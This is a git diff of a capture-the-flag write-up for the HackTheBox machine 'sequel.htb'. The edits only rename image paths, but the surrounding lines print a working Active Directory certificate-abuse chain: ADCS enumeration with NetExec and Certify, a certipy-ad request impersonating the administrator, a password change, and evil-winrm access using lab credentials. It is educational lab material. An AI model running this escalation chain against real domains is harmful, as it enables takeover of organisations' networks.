@@ -16,13 +16,13 @@
 nxc ldap 10.10.11.202 -u ryan.cooper -p NuclearMosquito3 -M adcs
 ```
 
-<figure><img src=".gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>
 
 ```
 .\Certify.exe cas
 ```
 
-<figure><img src=".gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 </details>
 
@@ -35,14 +35,14 @@ nxc ldap 10.10.11.202 -u ryan.cooper -p NuclearMosquito3 -M adcs
 .\Certify.exe find /vulnerable
 ```
 
-<figure><img src=".gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>
 
 ```bash
 # Use certipy-ad to request a certificate for domain admin
 certipy-ad req -u ryan.cooper@sequel.htb -p NuclearMosquito3 -upn administrator@sequel.htb -target sequel.htb -ca sequel-dc-ca -template UserAuthentication -dc-ip 10.10.11.202
 ```
 
-<figure><img src=".gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>
 
 ```bash
 # Download on Kali
@@ -60,7 +60,7 @@ change_password administrator P@ssw0rd123!
 evil-winrm -i dc.sequel.htb -u administrator
 ```
 
-<figure><img src=".gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (4) (1).png" alt=""><figcaption></figcaption></figure>
 
 </details>
 
